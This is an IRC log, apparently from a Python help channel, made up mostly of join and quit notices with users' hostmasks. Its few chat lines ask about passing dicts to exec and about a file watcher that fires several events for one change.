[23:45:15] *** Quits: jin23lee (~jin23lee@209.197.26.74) (Quit: Leaving)
[23:45:44] <amikrop> and have the "from"s and the "normals" mixed then? ok
[23:46:41] *** Quits: Chinesium (~Funk@unaffiliated/funk) (Quit: I probably fell asleep again)
[23:46:52] *** Joins: pylearner (~pylearner@50-1-114-34.dedicated.static.sonic.net)
[23:47:18] *** Joins: Chinesium (~Funk@unaffiliated/funk)
[23:47:33] *** Joins: bluesmonk (~diego@191.114.47.62)
[23:47:33] *** Quits: dxiri (~dxiri@2001:4878:8129:102:100::9e) (Remote host closed the connection)
[23:48:01] <ali1234> _habnabit: looks like i am wrong about exec, i *can* pass it the same dict twice - but then i have the problem that accessing the module's own things will be caught as a syntax error
[23:48:22] *** Quits: mrjohns (~juan@unaffiliated/mrjohns) (Ping timeout: 264 seconds)
[23:48:37] *** Quits: mefistofeles (~mefistofe@unaffiliated/mefistofeles) (Remote host closed the connection)
[23:48:55] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 268 seconds)
[23:49:00] *** Joins: unpythonic (~unpythoni@c-98-207-240-139.hsd1.ca.comcast.net)
[23:49:38] <ali1234> can probably work around that though... hmm
[23:49:46] *** Joins: badfilms (~badfilms@2001:5b0:4eca:c458:c046:905f:983f:46f3)
[23:50:13] <pylearner> https://paste.pound-python.org/show/YKU43IJ56xOOSldGTePS/ <--- I cannot figure out why but if I modify a file I will get like 5 events and I just want one event per file modification
[23:50:35] *** Joins: feodoran_ (~quassel@i577B06DF.versanet.de)
[23:50:36] *** feodoran is now known as Guest187
[23:50:39] *** Quits: Guest187 (~quassel@i577B05E6.versanet.de) (Read error: Connection reset by peer)
[23:50:49] *** feodoran_ is now known as feodoran
[23:50:55] *** Quits: Cache_Money (~mas@50-233-152-194-static.hfc.comcastbusiness.net) (Quit: Cache_Money)
[23:51:23] *** Joins: mefistofeles (~mefistofe@unaffiliated/mefistofeles)
[23:52:52] *** Joins: Sheilong (uid293653@gateway/web/irccloud.com/x-ltqyqyviolrrpikz)
[23:53:05] *** Quits: lolidunno (~lolidunno@cpe-45-50-100-24.socal.res.rr.com) (Quit: Leaving)
[23:54:03] *** Joins: Emrys0 (~emry@cpc110561-roth9-2-0-cust1166.17-1.cable.virginm.net)
[23:54:06] *** Joins: inerthia (~inerthia@unaffiliated/inerthia)
[23:54:38] *** Quits: amikrop (0255c8c9@gateway/web/freenode/ip.2.85.200.201) (Quit: Page closed)
[23:55:08] *** Quits: publio (~publio@unaffiliated/publio) (Quit: Bye.)
[23:56:37] *** Joins: mozzarella (~sam@unaffiliated/sam113101)
[23:56:56] *** Quits: scampbell (~scampbell@mail.scampbell.net) (Quit: Leaving)
[23:57:33] *** Quits: miz- (~miz-@unaffiliated/miz-) (Ping timeout: 268 seconds)
[23:57:44] *** Quits: jwarren (43aa56c5@gateway/web/freenode/ip.67.170.86.197) (Ping timeout: 260 seconds)
[23:57:56] *** Joins: lolidunno (~lolidunno@cpe-45-50-100-24.socal.res.rr.com)
[23:58:40] *** Quits: Chinesium (~Funk@unaffiliated/funk) (Quit: I probably fell asleep again)
[23:58:54] *** Joins: Leeds (~Leeds@223.16.213.143)
[23:58:55] *** Quits: inerthia (~inerthia@unaffiliated/inerthia) (Ping timeout: 256 seconds)
[23:59:00] *** Quits: mescalinum (~me@unaffiliated/mescalinum) (Ping timeout: 245 seconds)
